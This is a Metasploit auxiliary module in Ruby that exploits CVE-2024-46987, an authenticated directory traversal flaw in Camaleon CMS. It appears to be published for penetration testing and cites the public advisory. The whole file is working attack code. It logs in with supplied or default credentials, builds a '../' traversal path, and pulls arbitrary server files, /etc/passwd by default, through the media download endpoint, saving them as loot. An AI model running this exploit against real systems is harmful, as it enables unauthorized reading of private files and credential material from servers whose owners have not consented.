##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Camaleon CMS Directory Traversal CVE-2024-46987',
        'Description' => %q{
          Exploits CVE-2024-46987, an authenticated directory traversal
          vulnerability in Camaleon CMS versions <= 2.8.0 and 2.9.0
        },
        'Author' => [
          'Peter Stockli', # Vulnerability Disclosure
          'Goultarde',     # Python Script
          'BootstrapBool', # Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'References' => [
          ['CVE', '2024-46987'],
          [
            'URL',  # Advisory
            'https://securitylab.github.com/advisories/GHSL-2024-182_GHSL-2024-186_Camaleon_CMS/'
          ],
          [
            'URL',  # Python Script
            'https://github.com/Goultarde/CVE-2024-46987'
          ],
        ],
        'DisclosureDate' => '2024-08-08',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        Opt::RHOST,
        Opt::RPORT(80),
        OptString.new('USERNAME', [true, 'Valid username', 'admin']),
        OptString.new('PASSWORD', [true, 'Valid password', 'admin123']),
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptString.new('TARGETURI', [false, 'The Camaleon CMS base path']),
        OptString.new('VHOST', [false, 'Virtual host. ex: target.com']),
        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 13 ]),
        OptBool.new('SSL', [false, 'Use SSL', true]),
        OptBool.new('STORE_LOOT', [false, 'Store the target file as loot', true])
      ]
    )
  end

  def get_base_url(ssl, vhost, rhost)
    scheme = ssl ? 'https://' : 'http://'

    base_url = vhost.nil? ? rhost : vhost
    base_url = base_url[-1] == '/' ? base_url[0..-2] : base_url

    "#{scheme}#{base_url}"
  end

  def build_traversal_path(filepath, depth)
    # Remove C:\ prefix if present (path traversal doesn't work with drive letters)
    normalized_path = filepath.gsub(/^[A-Z]:\\/, '').gsub(/^[A-Z]:/, '')

    traversal = '../' * depth

    if normalized_path[0] == '/'
      return "#{traversal[0..-2]}#{normalized_path}"
    end

    "#{traversal}#{normalized_path}"
  end

  def get_token(login_url)
    res = send_request_cgi({ 'uri' => login_url, 'keep_cookies' => true })

    return nil unless res && res.code == 200

    match = res.body.match(/name="authenticity_token" value="([^"]+)"/)

    return match ? match[1] : nil
  end

  def authenticate(base_url, username, password, check)
    login_url = "#{base_url}/admin/login"

    vprint_status("Retrieving token from #{login_url}")

    token = get_token(login_url)

    if token.nil?
      print_error('Failed to retrieve token')
      return check ? Exploit::CheckCode::Unknown : false
    end

    if cookie_jar.empty?
      print_error('Failed to retrieve cookie')
      return check ? Exploit::CheckCode::Safe : false
    end

    vprint_status("Retrieved token #{token}")
    vprint_status("Authenticating to #{login_url} with credentials #{username}:#{password}")

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => login_url,
      'keep_cookies' => true,
      'vars_post' => {
        'authenticity_token' => token,
        'user[username]' => username,
        'user[password]' => password
      }
    })

    if res.nil? || res.code != 302
      return check ? Exploit::CheckCode::Safe : nil
    end

    res = send_request_cgi({ 'method' => 'GET', 'uri' => "#{base_url}/admin/dashboard" })

    if res.body.downcase.include?('logout')
      return true
    end

    return false unless check

    if !res.body.downcase.include?('camaleon')
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end

  def get_version(base_url)
    vprint_status('Attempting to get build number')

    res = send_request_cgi({ 'method' => 'GET', 'uri' => "#{base_url}/admin/dashboard" })

    return nil unless res && res.code == 200

    html = res.get_html_document

    version_div = html.css('div.pull-right').find do |div|
      div.at_css('b') && div.at_css('b').text.strip == 'Version'
    end

    version = version_div.text.strip.match(/Version\s*(\S+)/)[1] if version_div

    return version if version
  end

  def vuln_version?(base_url)
    version = get_version(base_url)

    if version.nil?
      vprint_warning('Failed to get build version')
      return false
    end

    vprint_status("Detected build version is #{version}")

    if version == '2.9.0'
      vprint_status('Version is vulnerable')
      return true
    end

    major, minor, patch = version.split('.').map(&:to_i)

    if major < 2 || major == 2 && (minor < 8 || minor == 8 && patch == 0)
      vprint_status('Version is vulnerable')
      return true
    end

    vprint_warning('Version is not vulnerable')
    return false
  end

  def get_file(base_url, filepath, username, password, check)
    vuln_version = false
    auth_res = authenticate(base_url, username, password, check)

    if auth_res != true
      print_error('Failed to authenticate')
      return auth_res
    end

    if check && vuln_version?(base_url) == true
      vprint_status('Version is vulnerable')
      vuln_version = true
    end

    filepath = build_traversal_path(filepath, datastore['DEPTH'])

    lfi_url = "#{base_url}/admin/media/download_private_file"

    vprint_status("Attempting to retrieve file #{filepath} from #{lfi_url}")

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => lfi_url,
      'vars_get' => {
        'file' => filepath
      },
      'encode_params' => false
    })

    if res
      if res.code == 404
        if check
          return vuln_version ? Exploit::CheckCode::Appears : Exploit::CheckCode::Detected
        end

        return nil
      end

      if res.body.downcase.include?('invalid file')
        return check ? Exploit::CheckCode::Safe : nil
      end

      vprint_good('Successfully retrieved file')
      return res.body

    elsif check
      return Exploit::CheckCode::Unknown
    end
  end

  def run
    cookie_jar.clear
    base_url = get_base_url(datastore['SSL'], datastore['VHOST'], datastore['RHOST'])
    res = get_file(base_url, datastore['FILEPATH'], datastore['USERNAME'], datastore['PASSWORD'], false)

    if res.nil? || res == false || !res.is_a?(String)
      print_error('Failed to obtain file')
      return
    end

    ip = datastore['VHOST'].nil? ? datastore['VHOST'] : datastore['RHOST']

    if datastore['STORE_LOOT']
      path = store_loot(
        'camaleon.traversal',
        'text/plain',
        ip,
        res,
        datastore['FILEPATH']
      )
      vprint_line
      vprint_line(res)
      print_good("#{datastore['FILEPATH']} stored as '#{path}'")
    else
      vprint_line
      print_line(res)
    end
  end

  def check
    base_url = get_base_url(datastore['SSL'], datastore['VHOST'], datastore['RHOST'])

    res = get_file(base_url, '/etc/passwd', datastore['USERNAME'], datastore['PASSWORD'], true)

    if res.nil? || res == false
      return Exploit::CheckCode::Unknown
    end

    return Exploit::CheckCode::Vulnerable if res.is_a?(String)

    res
  end
end
